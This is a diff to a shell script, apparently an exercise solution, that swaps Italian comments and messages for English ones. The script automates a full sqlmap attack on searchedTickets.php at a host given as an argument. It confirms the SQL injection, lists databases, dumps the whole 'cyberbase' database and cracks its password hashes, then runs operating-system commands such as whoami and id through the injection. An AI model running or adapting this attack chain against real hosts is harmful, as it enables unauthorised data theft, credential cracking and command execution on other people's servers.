@@ -2,31 +2,32 @@
 
 HOST="$1"
 if [ -z "$HOST" ]; then
-    echo "Uso: $0 <HOST>"
-    echo "Specificare l'host senza http:// e senza path - solo l'indirizzo o IP"
+    echo "Usage: $0 <HOST>"
+    echo "Specify the host without http:// and without path - only the address or IP"
     exit 1
 fi
 
-# Uso Sqlmap per verificare la SQL Injection
+# Use Sqlmap to check for SQL Injection
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch
 sleep 1
 
-# Guardo i database disponibili
+# List available databases
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --dbs
 sleep 1
 
-# Guardo lo schema del database "cyberbase"
+# Show the schema of the "cyberbase" database
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --schema
 sleep 1
 
-# Dumpo tutti i contenuti del DB cyberbase. Vengono anche craccate le password con un attacco dizionario
+# Dump all contents of the cyberbase DB. Passwords are also cracked with a dictionary attack
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --dump-all
 sleep 1
 
-# Ottengo una shell sul sistema operativo
+# Get a shell on the operating system
+# Cannot do it non-interactively!
 #sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-shell
 
-# Dò alcuni comandi sul sistema operativo
+# Run some commands on the operating system
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "whoami"
 sleep 1
 sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "id"
